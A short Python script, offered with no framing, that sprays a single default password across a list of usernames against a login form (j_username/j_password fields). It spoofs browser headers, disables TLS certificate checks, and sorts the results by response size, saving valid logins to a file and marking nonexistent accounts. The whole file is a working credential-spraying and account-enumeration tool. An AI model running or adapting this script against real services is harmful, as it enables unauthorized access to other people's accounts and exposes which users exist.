import os 
import sys 
import requests
import warnings

# Suppress InsecureRequestWarning
warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made.*")

url = "https://"
headers = {
    "Host": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "",
    "Referer": "",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
}

session = requests.Session()

def PostReq():
    global mail
    Password = Passworddef()
    with open('Users.txt', 'r') as file:
        for mail in file:
            mail = mail.strip()
            data = {
                "service.name": "files",
                "secure": "true",
                "fragment": "",
                "j_username": mail,
                "j_password": Password
            }
            SendReq(session, url, headers, data) 

def Passworddef():
    Passwd = input("Enter the default Password: ")
    print("This Is passwd " + Passwd)
    return Passwd

def SendReq(session, url, headers, data):
    response = session.post(url, headers=headers, data=data, verify=False)
    response_size = len(response.content)
    print("Tested UserName: " + mail)
    if response_size == 2979:
        print("Correct Attempt")
        with open("correct_attempts.txt", "a") as f:
            f.write(f"Tested UserName: {mail}\n")
    elif response_size == 17327:
        print("Not exist")
    else:
        print("Not Correct")
    print("Response Size:", response_size)
    print("-------------------------------------\n")

def main():
    PostReq()

if __name__ == "__main__":
    main()
